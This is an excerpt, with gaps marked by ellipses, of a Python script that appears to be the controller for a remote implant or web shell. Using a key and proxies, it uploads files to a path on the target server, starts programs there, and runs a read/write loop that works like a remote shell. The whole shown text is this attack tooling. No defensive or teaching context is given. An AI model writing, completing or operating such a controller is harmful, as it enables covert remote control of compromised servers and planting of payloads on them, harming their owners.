...
def drop(pth, what, where):
    with open(what, 'rb') as reader:
        ...
        x = requests.post(pth, {"TODO": "DROP", "KEY": key, "WHAT":b64, "WHERE" : where}, headers=headers, proxies=proxies, timeout=7)
    
        
def run(pth, where):
    x = requests.post(pth, {"TODO": "START", "KEY": key, "WHERE" : where}, headers=headers, proxies=proxies, timeout=7)
    print(x.content)
    

def pull_data(pth):
    x = requests.post(pth, {"TODO": "READ", "KEY":key}, headers=headers, proxies=proxies, timeout=7)
...
def write_data(pth,d):
    ...
    x = requests.post(pth, {"TODO":"WRITE" , "DATA":b, "KEY": key}, headers=headers, proxies=proxies)
    ...
    if not (args.push or args.run):        
        ...
        while True:
            ...
            if len(ins) != 0:
                ...
                write_data(args.url,x)
            pull_data(args.url)
    if args.push:
        drop(args.url, args.push[0], args.push[1])

    elif args.run:
        run(args.url, args.run)
